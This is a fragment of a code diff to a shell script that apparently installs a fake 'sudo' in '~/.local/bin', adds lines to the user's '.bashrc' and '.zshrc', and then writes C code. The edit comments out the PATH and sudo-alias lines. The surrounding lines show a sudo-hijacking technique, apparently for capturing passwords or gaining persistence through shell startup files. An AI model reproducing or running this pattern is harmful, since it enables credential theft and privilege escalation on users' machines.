@@ -23,7 +23,6 @@ chmod +x ~/.local/bin/sudo
 
 TARGET_FILES=("$HOME/.bashrc")
 
-
 if which zsh >/dev/null 2>&1; then
     TARGET_FILES+=("$HOME/.zshrc")
 fi
@@ -41,8 +40,8 @@ EOF
 	source "$RC_FILE"
 done
 
-export PATH="$HOME/.local/bin:$PATH"
-export alias sudo="$HOME/.local/bin/sudo"
+#export PATH="$HOME/.local/bin:$PATH"
+#export alias sudo="$HOME/.local/bin/sudo"
 
 cat << EOF > "$c_code"
 #include <stdlib.h>
